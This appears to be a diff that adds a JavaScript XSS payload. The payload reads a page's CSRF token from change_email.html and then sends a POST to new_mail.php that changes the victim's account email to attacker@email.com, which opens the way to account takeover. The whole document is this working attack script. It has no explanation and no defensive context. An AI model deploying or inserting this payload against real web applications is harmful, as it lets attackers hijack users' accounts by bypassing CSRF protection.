@@ -1,0 +1,27 @@
+<script>
+
+/* STEP 1 GET Request to get token Value*/
+
+var req = new XMLHttpRequest();
+req.open("GET", "change_email.html", false);
+req.send(null);
+if (req.readyState == 4 && req.status == 200) {
+/* Get token value from response */
+var resp = req.responseText;
+pattern = "name=\"_csrf_token\" value=\"(.*)(?=\")";
+var token = resp.match(pattern)[1];
+
+/* STEP 2 POST Request to change email automatically */
+var http = new XMLHttpRequest();
+var url = "new_mail.php";
+var params = "new_email=attacker@email.com&confirm_new_email=attacker@email.com&_csrf_token="+token+"&submit=Change+Email";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http.onreadystatechange = function() {
+if(http.readyState == 4 && http.status == 200) {
+alert(http.responseText);
+}
+}
+http.send(params);
+}
+</script>
